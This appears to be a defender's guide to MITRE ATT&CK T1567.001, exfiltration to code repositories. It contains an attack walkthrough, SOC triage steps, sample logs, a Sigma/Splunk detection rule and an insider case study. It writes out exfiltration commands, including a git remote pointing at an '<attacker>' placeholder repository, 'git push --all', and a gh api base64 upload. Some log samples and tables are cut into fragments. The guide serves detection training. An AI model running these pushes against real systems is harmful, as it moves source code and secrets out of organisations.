T1567.001 Exfiltration to Code Repository

Stolen data is pushed to a code-hosting site such as GitHub, GitLab, or Bitbucket using normal developer tools. Because a git push looks exactly like everyday engineering work, the upload blends in with trusted traffic and can carry source code, cloud keys, and other secrets straight out of the company.

Tactic: Exfiltration ID: T1567.001 Parent: T1567 Platforms: ESXi · Linux · Windows · macOS Type: Sub-technique Version 1.2 Created 09 March 2020 Last modified 12 May 2026

What happens

A git push or an application programming interface (API) upload sends data to a repository the attacker controls, often over plain HTTPS.

Chain position

Final stage of an attack. It often runs on developer laptops or continuous-integration (CI) runners that already hold valuable code.

Biggest risk

Developer traffic is trusted. Secrets ride along with the code, so one push can leak an entire business.

Detect with

git remote changes, endpoint detection and response (EDR) process lines, GitHub/GitLab audit logs, and data loss prevention (DLP) pattern matches.

Overview: What Is Exfiltration to Code Repository?

A plain-language tour of T1567.001, why it is one of the quietest ways to lose data, and what this guide teaches you to do about it.

Code-hosting platforms exist so that developers can copy code from one place to another many times a day. Exfiltration to Code Repository (T1567.001) abuses that routine: an attacker, or a departing insider, pushes stolen files to a repository they control on a public or semi-private code-hosting service. The tool doing the work is the same trusted git client, gh command-line interface (CLI), or representational state transfer (REST) API that your developers use all day. From the network's point of view, the traffic is an ordinary HTTPS (Hypertext Transfer Protocol Secure) upload to a well-known site.

This makes the technique unusually dangerous. Most exfiltration paths need unusual tools, strange domains, or large uploads that stand out. A repository push needs none of that. The attacker only needs three things: a way to reach a code host, valid credentials or a session token, and data that is already sitting on the machine. After the push, the data waits in a private repository that the attacker can clone from anywhere in the world — the corporate network never sees the final download.

▍Note: The MITRE ATT&CK page for T1567.001 lists the platforms as ESXi, Linux, Windows, and macOS. ESXi is VMware's virtualization host platform; the technique applies wherever repository tooling or secrets live, including on those hosts. ATT&CK created this entry on 09 March 2020. The current technique version is 1.2, last modified 12 May 2026. The ATT&CK page also lists real procedure examples: the Empire post-exploitation framework, the 2025 Shai-Hulud and Mini Shai-Hulud npm-worm campaigns, and TeamPCP Cloud Stealer. TeamPCP used a victim's own GITHUB_TOKEN to create a repository and upload stolen credentials. We cite all four because they are listed on the ATT&CK page.

▍Where it sits in the attack chain

Exfiltration is the last tactic (TA0010) in the ATT&CK model. By the time this technique runs, the attacker has usually finished the hard part. They hold access to a developer laptop, a CI runner, or a software-as-a-service (SaaS) account with repository rights. That is also why this technique is so valuable to them. The data is already local, or already reachable with a token. The exfiltration step itself is a single normal-looking command. It pairs naturally with credential access techniques such as Unsecured Credentials (T1552), which is where the tokens and keys that authorize the push come from.

Why it matters

One push can move an entire monorepo, including history, config files, and signing keys. Source code leaks are expensive to prove and impossible to undo, because the copy lives outside your control.

Who abuses it

Outside intruders after secrets, and malware families that dump environment variables to a repo. Most common of all, per DLP case data: departing employees who mirror code to a personal account.

Good news

Every push leaves at least four kinds of evidence: endpoint process lines, file writes under .git/, proxy or egress rows, and SaaS-side audit events. This guide shows how to join them.

    1. 1 · A developer's laptop.It is 01:40 on a Tuesday. DEV-LAP-0417 holds a checkout of the billing API, a .env file full of cloud keys, and a saved credential helper that can push without prompting. Nothing unusual has happened in weeks, so the SOC sees a clean baseline: the same sign-ins, the same pushes to the corporate remote as every night. Defender view: normal.
    2. 2 · Access.The attacker does not break anything. They replay a stolen session token captured weeks earlier from an infostealer log, and the identity provider (IdP) accepts it. No password, no second factor, no warning. On the canvas, the stolen session travels from the attacker to the developer workstation. Defender view: a sign-in from an unfamiliar city lands in the IdP queue; a "multi-factor authentication (MFA) fatigue / impossible-travel" alert is created but sits unwatched.
    3. 3 · Recon inside the repo.From the workstation, the attacker runs quiet searches for value: .env, settings.py, id_rsa, cloud-config files. The data never leaves the laptop yet, so there is nothing to catch on the wire. Defender view: EDR records an unusual burst of file reads at 02:00 from a process tree the user never runs in the small hours.
    4. 4 · A new remote appears.One short command — git remote add backup https://github.com/<attacker>/mirror.git — and the repository now has a second home. Git writes the new remote straight into .git/config. This file write is the single best endpoint-side clue of the whole attack. Defender view: Sysmon event 11 shows a new .git/config created under the project, and an EDR file-content hook sees a URL that is not the corporate host.
    5. 5 · The push.git push --all and git push --tags send every branch, every tag, and all history to the attacker's repository over HTTPS. Bytes flow from the workstation to the code host on the canvas. To the network it is a trusted developer doing a big upload. Defender view: the EDR process line shows a push to a non-corporate remote; if Transport Layer Security (TLS) inspection covers this path, DLP flags private-key patterns inside the outgoing payload.
    6. 6 · Attacker clones.From a rented virtual machine (VM), the attacker pulls the mirror down. The data has left the company's visibility completely: the final download happens on infrastructure you will never see. Defender view: nothing. The corporate network is silent — this step produces no logs on your side, which is why the next step matters so much.
    7. 7 · SaaS-side truth.The code host itself keeps the honest record. The organization audit log shows git activity from an unknown IP, a new deploy key added to the mirror repository, and a fresh personal access token (PAT) minted by the compromised account. Defender view: an org audit alert fires — "PAT created by service account" — if, and only if, those audit logs are actually streamed into the SIEM.
    8. 8 · SOC verdict.The SOC joins three sources: the EDR remote-add line, the audit-log PAT event, and the DLP match. Conclusion: exfiltration confirmed, so every secret in the repository must be treated as stolen. The team rotates cloud keys, invalidates tokens, and assumes the attacker holds a full clone. Defender view: secret-scanning results plus a rotation runbook — the incident becomes a checklist, not a mystery.

    ▍Note: The scenario is simplified for learning. Real intruders may split these actions across days, use CI runners instead of laptops, or push smaller archives through API uploads. The evidence pattern — new remote, push process line, egress to a code host, SaaS audit events — stays the same.

    Red Team / Hacker Perspective

    Why attackers pick a code repository instead of an obscure file-drop site. What they need in place first, and where this technique tends to go wrong for them. Everything here is for understanding and defense — commands are shown for your own lab repos only.

    ▍Why attackers like this path

    • The destination is trusted. HTTPS to github.com, gitlab.com, or bitbucket.org is allowed from almost every corporate network, because blocking it breaks the business. Very few companies can cut this route off without breaking the business.
    • Free private storage. A private repository gives the attacker encrypted-at-rest, versioned, password-protected storage with generous size limits — no hosting bill, no suspicious domain registration.
    • The tooling already exists. The git client, the gh CLI, and the platform REST APIs make scripted uploads a few lines long, and malware can reuse them without shipping its own transfer code.
    • CI machines are hard to lock down. Build runners often need broad egress to fetch dependencies, and they hold pipeline secrets, signing keys, and artifact copies — a single compromised runner is a high-value exfil point.

    ▍When and where this technique appears

    In the attack chain, this is a final-stage action. It runs after access, credential access, and collection are done, and it often runs quietly at the end of an intrusion. Timing clusters in three windows: the small hours, when fewer analysts watch; maintenance or release windows, when large uploads look normal; and notice periods, when a departing employee copies work.

    Where it appears follows the official platform list: ESXi, Linux, Windows, and macOS. In practice that means developer laptops (Windows or macOS), build runners (usually Linux), cloud identities with OAuth grants, and, less often, virtualization hosts whose scripts hold repository credentials. Any machine that can reach a code host with a valid token is a candidate.

    ▍Prerequisites an attacker needs

    Compared with most exfiltration techniques, the entry requirements are modest. The attacker needs three things. First, a reachable code host. Second, a valid identity on it — a stolen session cookie, a personal access token, a deploy key, or an OAuth app grant with repo scope. Third, data staged locally or reachable through the token. Nothing needs to be installed on the victim if a token already works with the platform API. This is why infostealer logs and leaked CI variables are such a strong start for this technique.

    ▲LAB-ONLY — practice against repositories you own. Set up a free account that belongs to you, create a private test repository, and run the following on a lab VM with fake sample files. Never point these commands at a repository you do not own, and never use work credentials on personal accounts.

    mkdir ~/lab-exfil && cd ~/lab-exfil && echo "fake-secret" > sample.env && git init && git add . && git commit -m "lab baseline".

    git remote add backup https://github.com/YOUR-OWN-ACCOUNT/lab-mirror.git.

    git push --all backup.

    Then watch what your own EDR, proxy, and (if you have one) audit-log streaming record. Delete the repo and rotate the test token afterwards, so the habit of cleanup sticks.

    ▲LAB-ONLY — API upload demo. With a token scoped to your own test repo, a single API call can create or update a file. That is how lightweight malware variants move small payloads:

    gh api --method PUT /repos/YOUR-OWN-ACCOUNT/lab-mirror/contents/lab.json -f message="lab" -f content="$(base64 -w0 lab.json)".

    In a lab, this shows why "no git.exe ran" is not proof that nothing was uploaded.

    ▍How this shows up in the wild

    These examples are listed on the ATT&CK page for T1567.001. They make good anchors for your threat hunting:

    • Shai-Hulud (S9008) — this September 2025 npm-worm campaign created a repository named Shai-Hulud under the compromised account. It committed a JSON (JavaScript Object Notation) dump with system information, environment variables, and collected secrets. It also posted stolen credentials to public GitHub repositories.
    • Mini Shai-Hulud (S9043) — a later variant. It exfiltrated data by creating a new public repository in the victim's own GitHub account, and it built repository names from a curated keyword list.
    • TeamPCP Cloud Stealer (S9041) — created a repository in the victim's GitHub account using the victim's own GITHUB_TOKEN and uploaded stolen credentials into it.
    • Empire (S0363) — the post-exploitation framework has long supported GitHub as an exfiltration and staging channel.

    ▍Common variations

    • Gist and snippet drips. Small chunks of data posted as private gists or pastes, one at a time, to stay below size-based rules.
    • CI artifact smuggling. The build pipeline itself uploads artifacts, caches, or test fixtures to an outside repository, so the transfer is made by the runner's own trusted identity.
    • Repository as a dead drop. The attacker does not only write — they also read tasking or tooling from a repo the operator updates, which borrows from the Web Service idea in T1102.
    • Tokens minted by malware. The infection creates its own PAT or OAuth grant through the API, so no user credential ever appears in a credential store.

    ▍Where attackers make mistakes

    • Pushing from a work IP with SSO enforced. If the organization enforces SSO or IP allow-lists on the code host, the push is refused and the attempt is logged. Attackers who skip this check hand you a detection.
    • Size and shape. A multi-gigabyte monorepo history pushed at 03:00 from a laptop is loud on egress dashboards even when the destination is trusted.
    • Commit timestamps. New commits carry the attacker's clock, and authorship metadata often names the wrong person — useful attribution evidence inside the leaked copy.
    • Reusable naming habits. Both Shai-Hulud variants used predictable repository names, which is exactly the kind of pattern that turns into a high-signal audit-log rule.

    ▍Note: Defenders should read this section as a list of preconditions to deny. Every bullet above maps to a control in section 7. SSO and IP allow-lists remove the access. Push protection removes the easy push. Audit-log streaming makes sure even a successful push is visible.

    Blue Team / SOC Perspective

    What this technique leaves behind on endpoints, networks, and code hosts. A triage flow then turns scattered artifacts into a confirmed verdict in under an hour.

    To the SOC, repository exfiltration is a two-surface problem. The endpoint surface shows the attacker touching git: new remotes, odd push commands, first-seen clients. The SaaS surface shows the code host accepting it: unfamiliar source IPs, fresh PATs, new deploy keys, unusual clone volume. If you only watch one surface, you will miss half the story — and the endpoint is the half most likely to be wiped or reimaged before anyone looks.

    ▍Artifacts you can expect to find

    Endpoint artifacts

    • EDR process lines for git.exe, gh, or curl with remote URLs in the command line, often outside working hours.
    • Sysmon event 11 — creation of a .git/config file, which records every added remote; file-content inspection can show the new URL.
    • Credential-helper noise — a fresh PAT pasted into git-credential-manager or a new SSH key under ~/.ssh.

    Network artifacts

    • Proxy or secure web gateway (SWG) rows showing CONNECT/POST to github.com, gitlab.com, or API hosts from a dev subnet, with egress byte counts far above normal.
    • DLP matches for source-code patterns, private keys in PEM (Privacy-Enhanced Mail) format, or .env structure in outbound bodies where TLS inspection applies.
    • Domain Name System (DNS) queries for code-host or paste domains from hosts that never contact them normally.

    SaaS-side artifacts

    • GitHub org audit log — git activity from unknown IPs, personal_access_token.create, deploy keys (public_key.create), new collaborators, clone spikes.
    • GitLab audit events — new keys, changed group membership, repository exports, unexpected push events.
    • IdP sign-in records — the session that started it all, usually with an unfamiliar IP or device fingerprint.

    CI / build artifacts

    • Runner logs — build jobs that touched unexpected remotes or called repository APIs directly.
    • Egress records from runner subnets to external code hosts that are not the company's own org.
    • Pipeline variable dumps in job logs — evidence of which secrets a compromised runner could reach.

    ▍Why this matters for the chain

    Repository exfiltration is usually the last logged action of an intrusion. That makes it a high-value pivot: every artifact in the chain can be pulled backwards from it. The workstation that pushed is the machine to triage. The account that minted the PAT is the session to revoke. The repo that received the push tells you what the attacker valued. Teams that treat the push event as the start of the investigation, not the end, scope incidents faster. They also rotate the right secrets instead of all of them.

    ▍First-hour triage flow

    1. Confirm the remote. From the EDR line or .git/config write, capture the exact remote URL, the timestamp, and the account that ran it. This URL decides everything that follows.
    2. Establish who and when. Join the endpoint user with IdP sign-ins around that window: was the session stolen (new city, new device), and what else did that session touch?
    3. Size the loss. Determine which branches and tags were pushed (push --all means everything) and whether the pushed tree contained .env files, keys, or customer data.
    4. Read the SaaS side. In the org audit log, list PAT creations, deploy-key additions, collaborator changes, and clone/download events in the same window — this proves what the attacker did after receiving the data.
    5. Rotate everything the repo could hold. Cloud keys, database passwords, signing material, and every PAT with repo scope — treat them as compromised even if you cannot prove they were read.
    6. Scope to other machines. Hunt the same remote URL, PAT, or repo name across all endpoints and runners, because attackers rarely stop at one laptop.

    ✓Good practice: Keep the triage flow on a runbook card next to the exfil detection alerts. The most common delay in real cases is not missing telemetry — it is the ten minutes a responder spends reconstructing which log lives where. Name the owner of each source (EDR, proxy, GitHub org audit) in the runbook itself.

    ▍5.2 · Threat intelligence

    Good detections start from watching the right sources and turning what they publish into rules and hunts. The collection → analysis → application loop works like this: collect new reports, IOC feeds, and audit-log samples into one place; analyze them for patterns that fit your environment (which code hosts, which OAuth grants, which naming habits); apply them as Sigma rules, Splunk scheduled searches, watchlists, and hunt hypotheses — then feed detections back as new intelligence.

    Free and open sources

    • MITRE ATT&CK site + STIX/TAXII (standard threat-intelligence exchange formats) — the technique page and its software entries; pull ATT&CK data as STIX to keep mappings current.
    • Vendor blogs — Microsoft, Mandiant, CrowdStrike, ESET, Kaspersky, and Red Canary regularly document npm-worms and infostealer-to-repo chains.
    • OSINT (open-source intelligence) — abuse.ch for malware infrastructure, Any.run for live behavior samples, malware-traffic-analysis.net for packet-level exercises, vx-underground for sample collections.

    Commercial and internal sources

    • Commercial feeds — Recorded Future and VirusTotal expose repository indicators and token-abuse reports worth pivoting on.
    • ISACs (information sharing and analysis centers) — MS-ISAC, FS-ISAC, H-ISAC, E-ISAC, and ICS-ISAC share sector-relevant exfil patterns and advisories.
    • Internal telemetry — your own past incidents, EDR history, honeypots, and DLP dispositions are the highest-value intel you own: they tell you what "normal abuse" looks like on your stack.

    Known actors and campaigns relevant to T1567.001 — with confidence levels. In this guide, High means multiple independent, credible sources or first-party vendor reporting agree. Medium means solid vendor reporting but with gaps, disputed claims, or single-source detail. Low means fragmentary or unverified reporting, useful only as a hunt idea.

    • Npm-worm campaigns (Shai-Hulud / Mini Shai-Hulud), 2025 — High confidence. Listed on the ATT&CK page: the worms created repositories under victim accounts and committed JSON dumps of system info, environment variables, and secrets.     • TeamPCP Cloud Stealer — High confidence. Listed on the ATT&CK page: used the victim's own GITHUB_TOKEN to create a repository and upload stolen credentials — a direct, documented match for this technique.
    • Empire framework — Medium confidence. Listed on the ATT&CK page as able to use GitHub for exfiltration; the capability is documented, but how often operators choose it in current campaigns is less clear.
    • Lazarus Group / Operation Dream Job — Medium confidence. Vendor reporting places GitHub inside the intrusion chain for staging and command-and-control (C2)-adjacent use; treat exfiltration-specific claims carefully and use repo-side indicators as hunt inputs.
    • Kimsuky — Medium confidence. Repeated vendor reporting of developer-platform abuse for staging and delivery; the pattern generalizes to exfil even where reports do not prove data left via repos.

Production secrets, signing keys, and customer data embedded in fixtures leave through a machine identity. Runners usually have wide egress by design and nobody profiles their traffic, so this path stays open and rarely alarms.
    High 3 · Malware creates a PAT or abuses the gh CLI to upload data Windows Linux Endpoint malware mints a personal access token through the API, or drives gh/curl, to upload staged files in small scripted batches. Endpoint infection; an authenticated account; API reachable from the host. Scripted exfiltration that blends with developer automation and leaves no user-visible window. It mirrors documented malware behavior (TeamPCP Cloud Stealer, Shai-Hulud), but depends on an extra infection step, so slightly less likely than scenarios 1–2.
    High 4 · Departing employee mirrors code to a personal repository Windows macOS Linux A leaving engineer copies the monorepo — and often environment files — to a private personal repo in their final weeks. Insider access; ability to create personal remotes; no leaver watch on DLP or audit logs. Intellectual-property theft with a clean, authorized-looking audit trail; hard to prove and harder to recover. Ranked High because it is the most frequently reported real-world pattern (DLP vendor case data), even though the technical path is simple.
    High 5 · OAuth app with repo scope used for exfiltration Cloud Identity A malicious or over-broad OAuth app grant lets the holder read and write repositories through the API at tenant scale. A user or admin grants the app; grant not restricted by app policies; API volume unmonitored. Tenant-wide reach: one grant can enumerate, clone, or push across many repositories without touching any endpoint. High because the reach is large and endpoint-free; the blind spot closes completely once audit logs stream to the SIEM, which keeps it below the top two.
    Medium 6 · Gist / snippet drip exfiltration in small chunks Windows macOS Linux Cloud Stolen data leaves as many small gist or paste uploads over days, each below file-size and DLP thresholds. Access to a gist/paste service; patience; small data set worth splitting. Slower theft of keys and snippets that evades volume rules and single-request content inspection. Medium: the small-and-slow shape beats size rules, but total loss is usually smaller and the repeated pattern is detectable with count-based rules.

    1 Compromised developer workstation Critical Windows macOS Linux

    Log sources and key fields: Sysmon process creation (EventID, Image, CommandLine, User, ParentImage) and file creation (TargetFilename); EDR process telemetry (process.name, process.command_line, first_seen); IdP sign-ins (userPrincipalName, ipAddress, city, authenticationDetails, riskLevelDuringSignIn).

    Normal behavior

    Git pushes go to the corporate remote from office or VPN ranges, during working hours, from a small set of known repo URLs; sign-ins come from the usual cities and devices.

    Suspicious behavior

    A git push whose command line names a remote outside the approved hosts; a new .git/config containing an unknown URL; an IdP sign-in from a new city followed by git activity within minutes.

    ▍Detection logic: Alert when a git client process pushes (or a .git/config is created) with a remote URL that fails the corporate allow-list, within 24 hours of a new-location sign-in for the same user.

    • CommandLine — push --all plus the remote name; the remote's URL lives in .git/config, so join both events.
    • ParentImage — here a suspicious temp-dir binary, not a shell the developer uses — proof this is not routine work.
    IdP sign-in — stolen session from a new city
    {

    2 CI/build runner exfiltration Critical Linux Cloud

    Log sources and key fields: proxy/SWG records from runner subnets (src_ip, host, method, url, bytes_out); runner process and job logs (job_id, step, executor); code-host audit events for the org (actor, repo, action).

    Normal behavior

    Runners fetch dependencies (GET) from package registries and push only to the company's own org remotes; egress volume is steady per build type.

    Suspicious behavior

    POST/PUT to an external code host from the runner subnet; job steps that curl artifacts off-host; audit events where the actor is a bot account but the repository is new or personal.

    ▍Detection logic: Alert when any host in the runner subnet makes an authenticated write request (POST/PUT, git-receive-pack) to a code host that is not the corporate org, or when egress from a runner exceeds its baseline by a set factor.

    Proxy record — runner pushing a large artifact to an outside repo
    {
  "ts": "2026-05-11T02:16:22Z",
  "src_ip": "10.42.7.31",
  "src_user": null,
  "host": "github.com",
  "method": "POST",

    • url — git-receive-pack is the actual git-push endpoint, and the repository is not the corporate org.
    • bytes_out — 941 MB in one request is an artifact dump, not a dependency fetch.

    3 Malware-minted PAT / gh CLI upload High Windows Linux

    Log sources and key fields: code-host org audit log (action, actor, ip, created_at, token_id); EDR process telemetry (process.name, process.command_line, file_hash.first_seen); endpoint proxy records for api.github.com/api.gitlab.com.

    Normal behavior

    Developers create tokens rarely, from managed devices, and use gh from shells with normal parents; API calls per token stay within a modest daily range.

    Suspicious behavior

    A PAT created at night from an unmanaged IP; gh.exe first seen on a host, launched by a non-shell parent; one token reading or writing dozens of repositories in minutes.

    ▍Detection logic: Alert on personal-access-token or deploy-key creation in the org audit log from an unfamiliar IP or outside working hours, and on first-seen gh/curl API clients whose parent process is not an interactive shell.

    4 Departing-employee code mirror High Windows macOS Linux

    Log sources and key fields: DLP events (rule, severity, user, dest, matches); proxy egress rows (bytes_out per user per host); code-host audit log (repo.create, repo.access.add); HR joiner-leaver feed (status, last_day).

    Normal behavior

    Clones and pulls to corporate remotes; small personal gists for public docs are rare and usually harmless; no large egress to personal accounts.

    Suspicious behavior

    A repository-sized upload to a personal account in the last 30 days of employment; DLP hits for source-code or private-key patterns on egress; a new personal repo created from an office IP range.

    ▍Detection logic: Correlate DLP source-code/secret matches on egress with leaver status: alert when a user whose notice period has started generates repository-shaped egress (large git-receive-pack or archive uploads) to any non-corporate destination.

    DLP event — private key pattern in an HTTPS upload body
    {
  "ts": "2026-05-11T09:41:12Z",

  "severity": "high",
  "user": "jmalik@corp.example",
  "src_ip": "10.20.9.88",

    • rule / matches — the content proof: key material inside an outbound body, whatever the destination claims to be.
    • user + HR status — join this field with the leaver feed; the same user on their notice period changes the response from "coach" to "investigate".
    • action — alert not block: decide the blocking posture deliberately in policy (blocking github.com org-wide usually gets the rule switched off — see section 8).

    5 OAuth app with repo scope High Cloud Identity

    Log sources and key fields: org audit log (oauth_authorization.create, token_scopes, actor, ip); IdP consent events (event_type, client, outcome); API usage metrics per token (token_id, requests_per_hour, repos_touched).

    Normal behavior

    Approved CI and code-quality apps hold scoped grants, consented by admins, with stable per-token request rates against known repos.

    Suspicious behavior

    A fresh grant carrying repo scope consented by a non-admin from an unknown IP; a token that suddenly enumerates or writes many repositories; grants to apps with no vendor identity.

    ▍Detection logic: Alert on OAuth authorization events whose scopes include write access to repositories (repo/write_repository) and whose token then exceeds a per-hour request or per-day repository count threshold.

    GitHub org audit log — OAuth grant with repo scope
    {
  "created_at": "2026-05-12T11:03:19Z",
  "action": "oauth_authorization.create",
  "actor": "svc-backup",
  "org": "northlake-corp",
  "programmatic_access_type": "OAuth access token",
  "token_scopes": ["repo", "read:org"],
  "ip": "198.51.100.23",
  "user_agent": "python-requests/2.31"
}
    • token_scopes — repo means full read/write of private repositories; any unexpected grant with it is a tenant-wide risk.
    • actor — a service account consenting an app is unusual by design; service identities should hold deploy keys, not interactive grants.
    • user_agent — a scripting library rather than the app's real client hints the grant is being driven manually.

    6 Gist / snippet drip exfiltration Medium Windows macOS Linux Cloud

    Log sources and key fields: proxy/SWG records (method, host, url, bytes_out, src_ip); CASB logs for unsanctioned apps; EDR process lines for curl/gh gist create.

    Normal behavior

    Engineers create the occasional public or secret gist to share snippets; single requests, small payloads, spread across many users.

    Suspicious behavior

    Many small POSTs to the gist API from one host in a short window; gists created by automation accounts; payload sizes just below a content-inspection threshold.

    ▍Detection logic: Count POSTs to gist/paste API endpoints per source host and per user within a short timeframe; alert when the count or the cumulative bytes cross a low threshold — the drip only hides from volume rules, not from counting rules.

    Proxy records — repeated small gist uploads from one host

{"ts":"2026-05-13T08:04:37Z","src_ip":"10.20.4.17","method":"POST","host":"api.github.com","url":"https://api.github.com/gists","bytes_out":1017,"status":201}
{"ts":"2026-05-13T08:09:52Z","src_ip":"10.20.4.17","method":"POST","host":"api.github.com","url":"https://api.github.com/gists","bytes_out":868,"status":201}
    • url — the gist API endpoint; one host posting here repeatedly is the pattern, regardless of payload content.
    • bytes_out — each under 1 KB, which is why single-request DLP never fires; the aggregate over the morning is the signal.
    • status — 201 (created) confirms the uploads succeeded, so the data left.

    R1 Git push to a non-corporate remote — High Windows macOS Linux

    sigma · push_to_non_corporate_remote.yml
    
title: Git Push to a Non-Corporate Remote
id: 3f2c1d84-6a9e-4b7d-8f31-52c0a9d4e7b1
status: experimental
description: >
  Detects a git client pushing to a remote that is not on the corporate allow-list.
  Intruders with a stolen developer session commonly add their own remote and run
  git push --all and git push --tags to move the whole repository out in one step.
references:
  - https://attack.mitre.org/techniques/T1567/001/
author: ATT&CK Guide Project (detection engineering study)
date: 2025-11-20
logsource:
  category: process_creation
  product: windows
  service: sysmon
detection:
  selection_git:
    Image|endswith:
      - '\git.exe'
      - '/git'
  selection_push:
    CommandLine|contains|all:
      - 'push'
      - 'http'
  filter_corp:
    CommandLine|contains:
      - 'git.mycompany.internal'
      - 'github.com/mycompany-org'
      - 'gitlab.mycompany.com'
  condition: selection_git and selection_push and not filter_corp
fields:
  - User
  - CommandLine
  - ParentImage
  - Hostname
  - UtcTime
falsepositives:
  - Developers pushing to approved mirror or backup remotes that are missing from the allow-list.
  - CI agents pushing release tags to public repositories as part of a documented build job.
level: high
tags:
  - attack.exfiltration
  - attack.t1567.001
    splunk · matching SPL
    index=sysmon sourcetype=XmlWinEventLog:Microsoft-Windows-Sysmon/Operational EventID=1
  Image="*\\git.exe" CommandLine="*push*" CommandLine="*http*"
  NOT CommandLine IN ("*git.mycompany.internal*", "*github.com/mycompany-org*", "*gitlab.mycompany.com*")
| stats count values(CommandLine) AS push_commands values(ParentImage) AS parents by Computer, User, _time
| sort - _time
    Mapping note
    Sigma maps Image/CommandLine to Sysmon 1 fields; in Splunk the same search runs against EDR process tables by swapping the base search for index=edr and the vendor's field names. The Sigma also matches the Linux/macOS binary form /git; the SPL shown targets the Windows Sysmon source, so add a parallel branch for non-Windows hosts.
    False positives
    Approved mirrors and CI tag-publish jobs — keep them in the filter_corp list and review the list monthly.
    Tuning
    Split HTTP and SSH forms of remotes (add a branch for git@ strings), and suppress during a documented release window if your CI publishes tags externally.
    Severity
    High — a single confirmed hit with an unfamiliar URL is worth an immediate page, not a batch review.

status: experimental
description: >

    Real-World Case Study: Project Northlake

    A two-week insider exfiltration at a SaaS startup, reconstructed end to end. This is an illustrative composite based on public DLP case reporting — details are blended and anonymized, not a single attributed incident.

    Northlake was a 140-person SaaS company with a single large monorepo, a billing service, and a dozen environment files holding cloud keys. A senior engineer resigned on a Friday with a four-week notice period. Within days, they began mirroring the monorepo — including a .env file and a private key used for signing — to a private repository on a personal GitHub account. Nothing was broken, no malware ran, and every credential used was their own. The case shows why insider exfiltration is detected by patterns, not by malware alerts.

    ▍Timeline

    • Day −14 · Friday 16:40

      Resignation accepted.

      HR opens a standard offboarding ticket for the engineer's final day in four weeks. Nobody adds the ticket to the SOC's leaver watch list — a gap that shapes everything below.

    • Day −7 · Friday 09:12

      Personal remote added.

      On their corporate laptop, the engineer runs git remote add personal https://github.com/<personal-account>/northlake-mirror.git. Sysmon 11 records the .git/config write, but the volume-based rule that week produced 40 clone-related events, and this one blended in.

    • Day −4 · Monday 19:03

      First mirror push.

      git push --all personal moves 1.9 GB of code and history to the personal repository over HTTPS. The proxy logs the egress row; no rule exists for repository-shaped uploads to non-corporate hosts, so the row is stored but never read.

    • Day −3 · Tuesday 08:55

      Secrets ride along.

      A second push adds the infrastructure directory, whose .env holds production cloud keys. The DLP agent has no pattern for PEM or .env structure — it was tuned for card numbers — so the transfer completes silently.

    • Day −1 · Thursday 10:21

      The tell: DLP fires.

      The engineer uploads a support bundle that happens to embed the signing key. The outbound body trips the rule "private key material in HTTPS body". The alert lands in the DLP queue with severity high.

    • Day −1 · Thursday 11:05

      SaaS side confirms.

      The SOC analyst pivots to the GitHub organization audit log (streamed to the SIEM months earlier): a repository created under the personal account from an office IP, two git pushes from the engineer's user, and a fresh personal access token created two days earlier. The endpoint and SaaS stories match.

    • Day 0 · Friday 12:30

      Containment begins.

      The on-call lead, legal, and HR join. Tokens are revoked, the personal remote's URL is blocked at the proxy, and SSO sessions for the engineer are disabled pending the conversation planned for Monday.

    • Day 3 · Monday 09:00

      Eradication and disclosure path.

      Forensic review of the pushed refs establishes exactly which files left: the full monorepo history, one .env, one signing key, and two customer fixtures. A takedown request goes to the code host's abuse team; the repository is removed within 48 hours, though clones cannot be proven absent.

    • Day 4–6

      Recovery.

      All cloud keys in the .env are rotated, the signing key is invalidated and reissued, and customer notifications go out per contract terms for the two fixtures containing demo data. Secret scanning is enabled org-wide with push protection.

    • Day 7–15

      Aftermath.

      The leaver watch list becomes automatic: notice-period users get DLP egress review by default. Audit-log streaming checks are added to the onboarding of every new SaaS tool.

    ▍Attack chain in one view

    Insider access (authorized user) → personal remote added to the corporate checkout (.git/config write) → staged pushes of code and secrets over HTTPS → PAT created to allow scripted access → data cloned outside company reach. Each stage is the same pattern as the outside-attacker simulation in section 2, minus the stolen session — which is why the same detections cover both.

    Detection point — what actually caught it

    Not the volume rule, not the endpoint: the catch was a DLP content match ("private key in HTTPS body") joined with the org audit log showing pushes from the engineer's account to a repo under a personal account from an office IP. Two mediocre signals, joined, became one clear verdict — the core lesson of the case.

    Impact

    Full source history and one production .env left the company; a signing key had to be revoked. Legal assessed intellectual-property loss exposure as significant but hard to quantify; one enterprise contract renewal was slowed by the notification letter. Direct costs stayed modest; the trust cost did not.

    Team response and communication

    Legal and HR spoke to the employee; the SOC briefed engineering leadership with a one-page fact sheet (what left, when, what was rotated); customer success handled notifications. No blame was aimed at the DLP analyst who cleared the earlier noise — the review focused on the missing patterns.

    Lessons learned

    Leaver monitoring must be automatic, not ticket-based. Secret scanning with push protection stops this class of leak at the server. Long-lived PATs are an unnecessary risk — expiry policies exist for exactly this. And SaaS audit logs only count if they stream into the SIEM where analysts actually look.

Public DLP reporting consistently describes the shape (notice period, personal mirror, DLP content match, audit-log confirmation), but specific numbers here — sizes, days, costs — are illustrative, invented for this guide, and should not be cited as real incident data.

    Mitigation and Defense

    Layered controls that remove the access, shrink the blast radius, and make any remaining push visible — organized by control area, with a prioritized action table at the end.

    Policy

    • Write an information-transfer policy that names code hosts explicitly: which repositories, which accounts, which destinations are approved.
    • Require that personal accounts never receive company code, and make the rule part of onboarding and offboarding paperwork.
    • Define a leaver watch: from notice day one, egress and audit logs for that user get reviewed by default.

    Identity

    • Enforce organization SSO on GitHub/GitLab so no long-lived local passwords exist, and require MFA for all members.
    • Ban classic personal access tokens in favor of fine-grained, short-lived tokens with automatic expiry.
    • Restrict OAuth app installations with an approval workflow; audit existing grants quarterly.

    Endpoint

    • Run EDR with process-line capture on all developer machines; keep Sysmon (event IDs 1 and 11) or vendor equivalents active.
    • Deploy endpoint DLP with patterns for private keys, .env structure, and source-code markers — not only card numbers.
    • Store nothing sensitive on laptops that policy says must never leave: secrets belong in a vault the laptop can reach but not copy.

    Network

    • Keep code-host egress allowed but measured: log full URLs and byte counts, and alert on repository-shaped uploads to non-corporate orgs.
    • Allow-list egress from CI runner subnets to package registries and your own code host; deny the rest.
    • Where TLS inspection is legal and agreed, include code-host traffic in inspection scope — trusted destination is not the same as trusted payload.

    Cloud / SaaS

    • Turn on secret scanning with push protection at the org level so known secret formats are refused at push time, server-side.
    • Apply IP allow-lists to the organization where the plan supports it, so pushes from unknown networks fail loudly.
    • Require branch protection and two-person review on repositories holding credentials or signing material.

    Logging and monitoring

    • Stream GitHub/GitLab org audit logs to the SIEM — this is the single highest-value action for this technique.
    • Keep proxy and DNS logs long enough to answer "what left, when, from where" months later.
    • Run the section 5.5 rules as scheduled searches and give each one a named owner and a documented response step.

    Backup and recovery

